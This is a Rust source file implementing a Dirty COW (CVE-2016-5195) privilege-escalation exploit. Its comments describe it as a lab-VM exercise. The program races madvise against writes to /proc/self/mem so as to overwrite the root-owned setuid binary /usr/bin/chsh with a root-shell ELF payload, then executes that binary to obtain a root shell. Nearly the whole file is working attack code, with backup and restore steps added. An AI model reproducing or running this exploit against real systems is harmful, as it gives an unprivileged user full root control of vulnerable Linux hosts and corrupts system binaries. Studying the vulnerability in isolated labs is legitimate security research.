use std::fs::{self, OpenOptions};
use std::io::{Read, Seek, SeekFrom, Write};
use std::os::unix::fs::MetadataExt;
use std::os::unix::io::AsRawFd;
use std::path::Path;
use std::process::Command;
use std::ptr;
use std::sync::{
    atomic::{AtomicBool, AtomicU64, Ordering},
    Arc,
};
use std::thread;
use std::time::{Duration, Instant};

fn main() -> std::io::Result<()> {
    // -------------------------------------------------------------------------
    // Research context
    // -------------------------------------------------------------------------
    // This is the setuid-target pivot for the Dirty COW / CVE-2016-5195 lab.
    //
    // The earlier /etc/passwd approach taught us the important lesson:
    //
    //   Dirty COW gives us a write primitive.
    //   It does not automatically give us a clean root shell.
    //
    // /etc/passwd was a fragile target:
    //   - exact line length mattered,
    //   - PAM/shadow behaviour could reject our password field,
    //   - partial writes broke authentication,
    //   - the old VM got upset in filesystem writeback.
    //
    // So this version pivots to a more classic privilege-escalation target:
    // a setuid-root binary.
    //
    // The idea:
    //
    //   1. Pick a root-owned setuid binary, e.g. /usr/bin/chsh.
    //   2. Back it up.
    //   3. Dirty COW overwrite the start of that binary with a tiny root-shell ELF.
    //   4. Execute the same setuid path.
    //   5. Because the file is still root-owned and setuid, the payload should
    //      start with effective UID 0.
    //
    // This is still only for a disposable lab VM.

    // -------------------------------------------------------------------------
    // Configuration
    // -------------------------------------------------------------------------
    // Avoid /bin/su and /usr/bin/sudo while developing. Breaking them is annoying.
    // /usr/bin/chsh is commonly setuid-root on old Ubuntu and is less critical.
    let target_path = "/usr/bin/chsh";

    // This file should be copied into the VM next to this binary.
    // It should be a tiny Linux x86_64 ELF that does:
    //
    //   setgid(0);
    //   setuid(0);
    //   execve("/bin/sh", ["sh", "-p"], NULL);
    //
    // The exploit writes this ELF over the start of the setuid target.
    let payload_path = "./rootsh_payload";

    // Backup of the original setuid binary. This is created before racing.
    // If we get root, restore immediately.
    let backup_path = "/tmp/chsh.dirtycow.backup";

    println!("[*] Dirty COW setuid pivot lab");
    println!("[*] Target:  {}", target_path);
    println!("[*] Payload: {}", payload_path);
    println!("[*] Backup:  {}", backup_path);

    // -------------------------------------------------------------------------
    // 1. Preflight target checks
    // -------------------------------------------------------------------------
    let target_meta = fs::metadata(target_path)?;
    let target_mode = target_meta.mode();
    let target_uid = target_meta.uid();
    let target_size = target_meta.len() as usize;

    println!("[*] Target owner uid: {}", target_uid);
    println!("[*] Target mode:      {:o}", target_mode & 0o7777);
    println!("[*] Target size:      {} bytes", target_size);

    if target_uid != 0 {
        eprintln!("[-] Refusing: target is not owned by root.");
        return Ok(());
    }

    if target_mode & 0o4000 == 0 {
        eprintln!("[-] Refusing: target is not setuid.");
        return Ok(());
    }

    if !Path::new(payload_path).exists() {
        eprintln!("[-] Missing payload file: {}", payload_path);
        eprintln!("[-] Copy rootsh_payload into the VM working directory first.");
        return Ok(());
    }

    let payload = fs::read(payload_path)?;
    let payload_len = payload.len();

    println!("[*] Payload size:     {} bytes", payload_len);

    if payload_len == 0 {
        eprintln!("[-] Refusing: payload is empty.");
        return Ok(());
    }

    if payload_len > target_size {
        eprintln!("[-] Refusing: payload is larger than target.");
        eprintln!("[-] Choose a larger setuid binary or a smaller payload.");
        return Ok(());
    }

    // Save the original binary before attempting the overwrite.
    // This is our undo rope.
    fs::copy(target_path, backup_path)?;
    println!("[*] Backup saved.");

    // -------------------------------------------------------------------------
    // 2. Map the target read-only and private
    // -------------------------------------------------------------------------
    // Same Dirty COW shape:
    //
    //   open target read-only
    //   mmap it MAP_PRIVATE
    //   race madvise(MADV_DONTNEED) against writes to /proc/self/mem
    //
    // On a fixed kernel, this should not alter the target file.
    // On the vulnerable kernel, the write can land in the backing file.
    let file = OpenOptions::new().read(true).open(target_path)?;
    let map_len = payload_len;

    let map = unsafe {
        libc::mmap(
            ptr::null_mut(),
            map_len,
            libc::PROT_READ,
            libc::MAP_PRIVATE,
            file.as_raw_fd(),
            0,
        )
    };

    if map == libc::MAP_FAILED {
        return Err(std::io::Error::last_os_error());
    }

    println!("[*] Mapping established at {:p}", map);

    // -------------------------------------------------------------------------
    // 3. Race control and instrumentation
    // -------------------------------------------------------------------------
    let running = Arc::new(AtomicBool::new(true));
    let madvise_count = Arc::new(AtomicU64::new(0));
    let write_count = Arc::new(AtomicU64::new(0));

    let map_usize = map as usize;

    // Thread A: madvise pressure.
    let r_mad = running.clone();
    let c_mad = madvise_count.clone();

    let madvise_thread = thread::spawn(move || {
        let map_ptr = map_usize as *mut libc::c_void;

        while r_mad.load(Ordering::SeqCst) {
            unsafe {
                libc::madvise(map_ptr, map_len, libc::MADV_DONTNEED);
            }

            let count = c_mad.fetch_add(1, Ordering::Relaxed) + 1;

            // Keep pressure, but avoid pure kernel woodchipper mode.
            thread::yield_now();

            if count % 50 == 0 {
                thread::sleep(Duration::from_micros(100));
            }
        }
    });

    // Thread B: writer pressure through /proc/self/mem.
    let r_write = running.clone();
    let c_write = write_count.clone();
    let writer_payload = payload.clone();

    let writer_thread = thread::spawn(move || {
        let mut mem_file = OpenOptions::new()
            .read(true)
            .write(true)
            .open("/proc/self/mem")
            .expect("failed to open /proc/self/mem");

        let mut local_writes = 0u64;

        while r_write.load(Ordering::SeqCst) {
            let _ = mem_file.seek(SeekFrom::Start(map_usize as u64));
            let _ = mem_file.write_all(&writer_payload);

            local_writes += 1;
            c_write.fetch_add(1, Ordering::Relaxed);

            // The /etc/passwd target needed very gentle handling because a tiny
            // overwrite could destabilise auth/filesystem state.
            //
            // The setuid binary target is different: the payload is much larger
            // than the passwd-line payload, so the race needs more write pressure.
            //
            // Yield/sleep every 100 writes instead of after every write. This is
            // still not maximum violence, but it gives the 20KB-ish ELF payload
            // a better chance of landing.
            if local_writes % 100 == 0 {
                thread::yield_now();
                thread::sleep(Duration::from_micros(100));
            }
        }
    });

    // -------------------------------------------------------------------------
    // 4. Success fuse
    // -------------------------------------------------------------------------
    // We stop as soon as the beginning of the target file matches our payload.
    // This avoids continuing to write after success.
    println!("[*] Race active against setuid target...");
    let start = Instant::now();
    let mut success = false;

    loop {
        if let Ok(mut check_file) = OpenOptions::new().read(true).open(target_path) {
            let mut check_buf = vec![0u8; payload_len];

            if check_file.read_exact(&mut check_buf).is_ok() && check_buf == payload {
                running.store(false, Ordering::SeqCst);
                success = true;
                println!("[+] SUCCESS: target prefix now matches payload.");
                break;
            }
        }

        // Setuid binary overwrite is a larger write than the /etc/passwd version.
        // The earlier 3s timeout was safe but too short for a 20KB payload.
        if start.elapsed() > Duration::from_secs(15) {
            running.store(false, Ordering::SeqCst);
            println!("[-] Timeout: race did not land.");
            break;
        }

        thread::sleep(Duration::from_millis(1));
    }

    let _ = madvise_thread.join();
    let _ = writer_thread.join();

    unsafe {
        libc::munmap(map, map_len);
        libc::sync();
    }

    println!(
        "[*] Stats: madvise={}, writes={}",
        madvise_count.load(Ordering::Relaxed),
        write_count.load(Ordering::Relaxed)
    );

    // -------------------------------------------------------------------------
    // 5. Execute proof
    // -------------------------------------------------------------------------
    if success {
        println!("[*] Executing overwritten setuid target: {}", target_path);
        println!("[*] If a shell opens, run:");
        println!("    id");
        println!();
        println!("[*] If uid/euid is 0, restore immediately:");
        println!("    cp {} {}", backup_path, target_path);
        println!("    chmod 4755 {}", target_path);
        println!("    sync");
        println!();

        let status = Command::new(target_path).status()?;
        println!("[*] Target exited with: {}", status);
    } else {
        println!("[*] No execution attempted because the race did not land.");
    }

    Ok(())
}